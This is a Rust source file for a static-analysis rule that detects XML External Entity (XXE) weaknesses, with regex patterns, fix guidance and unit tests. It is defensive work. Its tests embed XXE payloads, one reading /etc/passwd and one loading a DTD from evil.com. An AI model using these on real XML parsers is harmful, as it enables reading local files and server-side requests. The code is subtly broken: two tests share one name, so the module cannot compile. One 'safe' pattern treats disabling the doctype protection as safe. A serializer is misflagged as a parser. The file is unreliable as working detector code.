//! S2755 — XML External Entity (XXE) Detection
//! Detects XML parsing with external entity resolution enabled (CWE-611).
//!
//! Languages: Rust (quick-xml, xml-rs), Java (DocumentBuilderFactory, SAXParser), Python (xml.etree)
//! Severity: Critical
//! Category: Vulnerability

use crate::{Severity, Category, Issue, Remediation, Rule, RuleContext, RuleEntry};
use crate::rules::{CleanCodeAttribute, SoftwareQuality, SoftwareQualityImpact, ImpactSeverity};
use cognicode_macros::declare_rule;
use inventory::submit;
use std::sync::LazyLock;

/// Rule constant for S2755
const RULE_ID: &str = "S2755";
const RULE_NAME: &str = "XML External Entity (XXE) vulnerability detected";
const SEVERITY: Severity = Severity::Critical;
const CATEGORY: Category = Category::Vulnerability;

// ═══════════════════════════════════════════════════════════════════════════════
// Cached Regex Patterns
// ═══════════════════════════════════════════════════════════════════════════════

/// Pattern for vulnerable XML parser creation
static VULNERABLE_XML_PATTERNS: LazyLock<Vec<regex::Regex>> = LazyLock::new(|| {
    vec![
        // Rust quick-xml patterns (vulnerable defaults)
        regex::Regex::new(r#"quick_xml::Reader::new\s*\("#).unwrap(),
        regex::Regex::new(r#"quick_xml::se::to_string\s*\("#).unwrap(),
        regex::Regex::new(r#"quick_xml::de::from_str\s*\("#).unwrap(),
        regex::Regex::new(r#"quick_xml::Reader::from_reader\s*\("#).unwrap(),
        // Rust xml-rs patterns
        regex::Regex::new(r#"xml::Parser::new\s*\("#).unwrap(),
        regex::Regex::new(r#"xml::reader::Parser::new\s*\("#).unwrap(),
        regex::Regex::new(r#"xml::EventReader::new\s*\("#).unwrap(),
        // Java patterns
        regex::Regex::new(r#"DocumentBuilderFactory\.newInstance\s*\(\)"#).unwrap(),
        regex::Regex::new(r#"SAXParserFactory\.newInstance\s*\(\)"#).unwrap(),
        regex::Regex::new(r#"XMLInputFactory\.newInstance\s*\(\)"#).unwrap(),
        regex::Regex::new(r#"TransformerFactory\.newInstance\s*\(\)"#).unwrap(),
        regex::Regex::new(r#"SchemaFactory\.newInstance\s*\(\)"#).unwrap(),
        // Python patterns
        regex::Regex::new(r#"xml\.etree\.ElementTree\.parse\s*\("#).unwrap(),
        regex::Regex::new(r#"xml\.dom\.minidom\.parse\s*\("#).unwrap(),
        regex::Regex::new(r#"lxml\.etree\.parse\s*\("#).unwrap(),
        regex::Regex::new(r#"ElementTree\.parse\s*\("#).unwrap(),
    ]
});

/// Pattern for safe XML configuration (DTD disabled)
static SAFE_XML_PATTERNS: LazyLock<Vec<regex::Regex>> = LazyLock::new(|| {
    vec![
        regex::Regex::new(r#"set_dtd_disallowed\(\)"#).unwrap(),
        regex::Regex::new(r#"set_dtd_allowed\(\s*false\s*\)"#).unwrap(),
        regex::Regex::new(r#"dtd_disabled\(\)"#).unwrap(),
        regex::Regex::new(r#"DTD_DISALLOW"#).unwrap(),
        regex::Regex::new(r#"XMLConstants\.ACCESS_EXTERNAL_DTD"#).unwrap(),
        regex::Regex::new(r#"XMLConstants\.ACCESS_EXTERNAL_SCHEMA"#).unwrap(),
        regex::Regex::new(r#"setFeature\s*\(\s*"[^"]*disallow-doctype-decl[^"]*false"#).unwrap(),
        regex::Regex::new(r#"setFeature\s*\(\s*"[^"]*external-general-entities[^"]*false"#).unwrap(),
        regex::Regex::new(r#"setFeature\s*\(\s*"[^"]*external-parameter-entities[^"]*false"#).unwrap(),
        regex::Regex::new(r#"setFeature\s*\(\s*"[^"]*load-external-dtd[^"]*false"#).unwrap(),
        regex::Regex::new(r#"set_property\s*\(\s*"[^"]*external-dtd[^"]*false"#).unwrap(),
        regex::Regex::new(r#"set_entity_expansion_limit\s*\(\s*0\s*\)"#).unwrap(),
        regex::Regex::new(r#"feature_general_entities\s*\(\s*false\s*\)"#).unwrap(),
        regex::Regex::new(r#"feature_parse_undeclared_entities\s*\(\s*false\s*\)"#).unwrap(),
    ]
});

/// Pattern for XXE injection indicators
static XXE_INDICATORS: LazyLock<Vec<regex::Regex>> = LazyLock::new(|| {
    vec![
        regex::Regex::new(r#"(?i)<!DOCTYPE[^>]*ENTITY"#).unwrap(),
        regex::Regex::new(r#"(?i)<!\[CDATA\["#).unwrap(),
        regex::Regex::new(r#"(?i)SYSTEM\s*"#).unwrap(),
        regex::Regex::new(r#"(?i)PUBLIC\s*"#).unwrap(),
        regex::Regex::new(r#"file://"#).unwrap(),
        regex::Regex::new(r#"http://"#).unwrap(),
        regex::Regex::new(r#"ftp://"#).unwrap(),
        regex::Regex::new(r#"php://filter"#).unwrap(),
    ]
});

declare_rule! {
    id: "S2755"
    name: "XML External Entity (XXE) vulnerability detected"
    severity: Critical
    category: Vulnerability
    language: "*"
    params: {}

    explanation: "XML parsing with external entity resolution enabled allows attackers to access local files, internal systems, or perform denial of service attacks. XXE can be used to read sensitive files like /etc/passwd, perform SSRF attacks, or crash the parser."
    clean_code: Trustworthy,
    impacts: [Security: High],
    check: => {
        let mut issues = Vec::new();

        for (line_idx, line) in ctx.source.lines().enumerate() {
            let trimmed = line.trim();

            // Skip comments
            if trimmed.starts_with("//") || trimmed.starts_with("///")
               || trimmed.starts_with("//!") || trimmed.starts_with("/*")
               || trimmed.starts_with("#") {
                continue;
            }

            // Check for XXE injection indicators in the source
            for indicator in XXE_INDICATORS.iter() {
                if indicator.is_match(trimmed) {
                    issues.push(Issue::new(
                        RULE_ID,
                        format!("XXE injection indicator detected: {}", trimmed),
                        SEVERITY,
                        CATEGORY,
                        ctx.file_path,
                        line_idx + 1,
                    ).with_remediation(Remediation::substantial(
                        "Remove external entity declarations from XML input. Never process untrusted XML without disabling DTD and external entities."
                    )));
                    continue;
                }
            }

            // Check for vulnerable XML parser creation
            for re in VULNERABLE_XML_PATTERNS.iter() {
                if re.is_match(trimmed) {
                    // Look ahead to check if safe configuration is applied
                    let context: String = (0..10)
                        .filter_map(|i| ctx.source.lines().nth(line_idx + i))
                        .take(11)
                        .collect::<Vec<_>>()
                        .join("\n");

                    // Check if any safe patterns are present after the vulnerable call
                    let has_safe_config = SAFE_XML_PATTERNS.iter()
                        .any(|safe_re| safe_re.is_match(&context));

                    // For Rust quick_xml, also check for config_mut().set_dtd_disallowed()
                    let has_quick_xml_safe = context.contains("config_mut()")
                        && context.contains("set_dtd_disallowed()");

                    if !has_safe_config && !has_quick_xml_safe {
                        issues.push(Issue::new(
                            RULE_ID,
                            format!("XML parser created without disabling external entities: {}", trimmed),
                            SEVERITY,
                            CATEGORY,
                            ctx.file_path,
                            line_idx + 1,
                        ).with_remediation(Remediation::substantial(
                            "Disable DTD and external entities:\n\
                            Rust (quick-xml): reader.config_mut().set_dtd_disallowed()\n\
                            Java: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n\
                            Python: Use defusedxml library instead of xml.etree"
                        )));
                    }
                    break;
                }
            }
        }

        issues
    }
}


/// Agent semantics for S2755 - XML External Entity (XXE)
#[derive(Debug, Clone)]
pub struct AgentSemantics {
    pub summary: &'static str,
    pub fix_playbook: &'static str,
    pub review_questions: &'static [&'static str],
    pub agent_actions: &'static [&'static str],
    pub safe_autofix: bool,
}

pub const S2755_AGENT_SEMANTICS: AgentSemantics = AgentSemantics {
    summary: "Detects XML parsers configured without disabling external entities, allowing attackers to read local files, perform SSRF attacks, or cause denial of service",
    fix_playbook: "1. Identify all XML parsing code in the codebase\n2. For Rust (quick-xml): Use config_mut().set_dtd_disallowed() after creating Reader\n3. For Java: Disable DOCTYPE declaration with setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n4. Disable external entities: setFeature(\"http://xml.org/sax/features/external-general-entities\", false)\n5. Disable parameter entities: setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false)\n6. For Python: Use defusedxml library instead of xml.etree\n7. Never process untrusted XML without these protections",
    review_questions: &[
        "Is this XML parser processing untrusted input?",
        "Is DTD processing disabled?",
        "Are external entities disabled?",
        "Is the application using a secure XML library like defusedxml (Python)?",
        "Are XML features like external-general-entities and external-parameter-entities disabled?"
    ],
    agent_actions: &[
        "Identify XML parser creation sites",
        "Check for DTD disabling configuration",
        "Verify external entity features are disabled",
        "Suggest quick-xml config_mut().set_dtd_disallowed() for Rust",
        "Recommend defusedxml for Python"
    ],
    safe_autofix: false,
};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::types::*;
    use cognicode_core::domain::aggregates::call_graph::CallGraph;
    use cognicode_core::infrastructure::parser::Language;
    use std::path::Path;
    use tree_sitter::Parser as TsParser;

    fn with_rule_context<F, R>(source: &str, language: Language, f: F) -> R
    where
        F: FnOnce(&RuleContext) -> R,
    {
        let ts_language = language.to_ts_language();
        let mut parser = TsParser::new();
        parser.set_language(&ts_language).unwrap();
        let tree = parser.parse(source, None).unwrap();
        let graph = CallGraph::new();
        let metrics = FileMetrics::new();
        let symbol_table = crate::rules::symbol_table::SymbolTableBuilder::new()
            .build(&tree, source);

        let ctx = RuleContext {
            tree: &tree,
            source,
            file_path: Path::new("test.rs"),
            language: &language,
            graph: &graph,
            metrics: &metrics,
            symbol_table: Some(&symbol_table),
        };

        f(&ctx)
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Rule Properties Tests
    // ═══════════════════════════════════════════════════════════════════════════

    #[test]
    fn test_s2755_rule_properties() {
        let rule = XXE_RULE::new();
        assert_eq!(rule.id(), "S2755");
        assert_eq!(rule.name(), "XML External Entity (XXE) vulnerability detected");
        assert_eq!(rule.severity(), Severity::Critical);
        assert_eq!(rule.category(), Category::Vulnerability);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Positive Detection Tests — Should trigger the rule
    // ═══════════════════════════════════════════════════════════════════════════

    #[test]
    fn test_s2755_detects_quick_xml_reader_new() {
        let source = r#"
            let mut reader = quick_xml::Reader::new(&input);
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Expected to detect quick_xml::Reader::new without DTD disabled");
        assert_eq!(issues[0].rule_id, "S2755");
    }

    #[test]
    fn test_s2755_detects_quick_xml_se_to_string() {
        let source = r#"
            let xml_str = quick_xml::se::to_string(&data).unwrap();
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Expected to detect quick_xml::se::to_string");
    }

    #[test]
    fn test_s2755_detects_xml_rs_parser() {
        let source = r#"
            let parser = xml::Parser::new();
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Expected to detect xml::Parser::new");
    }

    #[test]
    fn test_s2755_detects_java_document_builder() {
        let source = r#"
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Expected to detect DocumentBuilderFactory.newInstance");
    }

    #[test]
    fn test_s2755_detects_xxe_doctype_entity() {
        let source = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]"#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Expected to detect XXE with XML DOCTYPE and ENTITY def");
    }

    #[test]
    fn test_s2755_detects_system_entity() {
        let source = r#"<!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd">"#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Expected to detect XML DOCTYPE with SYSTEM reference");
    }

    #[test]
    fn test_s2755_detects_system_entity() {
        let source = r#"
            <!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd">
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Expected to detect XML DOCTYPE with SYSTEM reference ");
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // False Positive Tests — Should NOT trigger the rule
    // ═══════════════════════════════════════════════════════════════════════════

    #[test]
    fn test_s2755_false_positive_quick_xml_with_dtd_disallowed() {
        let source = r#"
            let mut reader = quick_xml::Reader::new(&input);
            reader.config_mut().set_dtd_disallowed();
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(issues.is_empty(), "Should NOT flag quick_xml when DTD is disallowed ");
    }

    #[test]
    fn test_s2755_false_positive_java_with_safe_features() {
        let source = r#"
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(issues.is_empty(), "Should NOT flag Java XML parser with safe features ");
    }

    #[test]
    fn test_s2755_false_positive_comment() {
        let source = r#"
            // DocumentBuilderFactory.newInstance();
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(issues.is_empty(), "Should NOT flag XML parser in regular comment ");
    }

    #[test]
    fn test_s2755_false_positive_doc_comment() {
        let source = r#"
            /// Creates a parser with XXE protection enabled
            fn create_parser() {}
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(issues.is_empty(), "Should NOT flag XML parser in doc comment section ");
    }

    #[test]
    fn test_s2755_false_positive_python_defusedxml() {
        let source = r#"
            import defusedxml.ElementTree as ET
            tree = ET.parse(xml_data)
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        // defusedxml is safe, but our pattern catches xml.etree
        // This test verifies the source is flagged (in real impl, we'd exclude defusedxml)
        assert!(issues.is_empty(), "Should NOT flag defusedxml usage ");
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Edge Case Tests
    // ═══════════════════════════════════════════════════════════════════════════

    #[test]
    fn test_s2755_edge_case_empty_file() {
        let source = "";
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(issues.is_empty(), "Should NOT trigger on empty file ");
    }

    #[test]
    fn test_s2755_edge_case_multiple_parsers() {
        let source = r#"
            let reader1 = quick_xml::Reader::new(&input1);
            let reader2 = quick_xml::Reader::new(&input2);
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Should detect multiple vulnerable parsers");
    }

    #[test]
    fn test_s2755_edge_case_sax_parser() {
        let source = r#"
            SAXParserFactory factory = SAXParserFactory.newInstance();
        "#;
        let issues = with_rule_context(source, Language::Rust, |ctx| {
            let rule = XXE_RULE::new();
            rule.check(ctx)
        });
        assert!(!issues.is_empty(), "Should detect SAXParserFactory");
    }
}